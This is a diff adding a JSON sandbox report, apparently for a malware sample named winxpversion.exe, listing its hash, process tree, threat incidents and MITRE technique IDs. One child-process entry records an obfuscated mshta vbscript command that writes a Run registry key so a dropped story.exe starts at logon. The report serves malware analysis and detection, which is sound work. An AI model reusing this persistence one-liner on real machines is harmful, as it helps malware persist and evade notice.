@@ -1,0 +1,78 @@
+{
+ "Name": "winxpversion.exe",
+ "Md5": "938a59db4094a619bfdee17da1e6d817",
+ "UUID": "d27bfdb9-3273-4f80-b1cf-441bac45dcf7",
+ "Processes": [
+  {
+   "OID": "5c6cf156d23421253cccf578",
+   "ProcessID": 3072,
+   "ParentPID": 284,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\winxpversion.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\winxpversion.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1550643541717
+  },
+  {
+   "OID": "5c6cf157d23421253cccf78a",
+   "ProcessID": 2432,
+   "ParentPID": 3072,
+   "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" vbscript:Execute(\" str1 = \"\"WScript.Shell\"\" : str2 = \"\"Set WshShell = CrXXteObject(str1)\"\" : str2 = Replace(str2,\"\"XX\"\",\"\"ea\"\") : execute str2 : myKey = \"\"HKCU\\Software\\Microsoft\\Windows\\:\\Run\\Stiftelsesoverenskomster\"\" :  myKey = \"\"HKCU\\Software\\Microsoft\\Windows\\X\\Run\\NOME\"\" : myKey=replace(myKey,\"\":\"\",\"\"CurrentVersion\"\") : WshShell.RegWrite myKey,\"\"C:\\Users\\admin\\AppData\\Local\\Temp\\story.exe\"\",\"\"REG_SZ\"\" : window.close\")",
+   "Image": "C:\\Windows\\System32\\mshta.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1550643542810
+  },
+  {
+   "OID": "5c6cf158d23421253cccf8a1",
+   "ProcessID": 3568,
+   "ParentPID": 3072,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\story.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\story.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1550643543123
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5c6cf158d23421253cccf8a1",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c6cf158d23421253cccf8a1",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1065"
+   ]
+  },
+  {
+   "ProcessOID": "5c6cf158d23421253cccf8a1",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c6cf158d23421253cccf8a1",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c6cf157d23421253cccf78a",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5c6cf156d23421253cccf578",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c6cf156d23421253cccf578",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1170",
+    "T1064"
+   ]
+  }
+ ]
+}
